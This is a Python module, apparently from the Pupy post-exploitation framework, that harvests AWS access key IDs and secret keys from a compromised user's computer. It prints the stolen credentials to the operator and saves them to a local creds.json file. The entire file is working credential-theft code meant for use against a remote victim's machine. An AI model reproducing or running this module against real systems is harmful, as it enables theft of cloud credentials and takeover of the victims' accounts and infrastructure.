# -*- coding: UTF8 -*-
# Author: @BradErz
# Contributor(s):

from pupylib.PupyModule import *
from os import path, makedirs
import json

__class_name__ = "AWSCredentials"


@config(compatibilities=['windows', 'linux', 'darwin'], category="creds")
class AWSCredentials(PupyModule):
    """Get AWS credntials from a users pc"""
    is_module = False

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="aws_credentials", description=self.__doc__)

    def run(self, args):
        self.client.load_package("aws_credentials")
        aws_creds = self.client.conn.modules['aws_credentials'].AWSCredentials()
        aws_creds.run()

        if aws_creds.creds_found:
            for item in aws_creds.creds_found:
                self.log("Profile Name: %s" % item['profile_name'])
                self.log("Location: %s" % item['location'])
                self.log("Access key ID: %s" % item['aws_access_key_id'])
                self.log("Access secret key: %s" % item['aws_secret_access_key'])
        else:
            self.log("Couldn't find anything ;(")

        try:
            # If the directory doesnt exist then try to create it
            if not path.isdir(path.join("data", "aws_creds")):
                makedirs(path.join("data", "aws_creds"))
        except Exception as error:
            self.error("Couldn't create the directory data/screenshots %s" % error)

        with open(path.join("data", "aws_creds", "creds.json"), 'w') as outfile:
            self.log("Writing credentials to creds.json ")
            json.dump(aws_creds.creds_found, outfile, sort_keys=True, indent=4, ensure_ascii=False)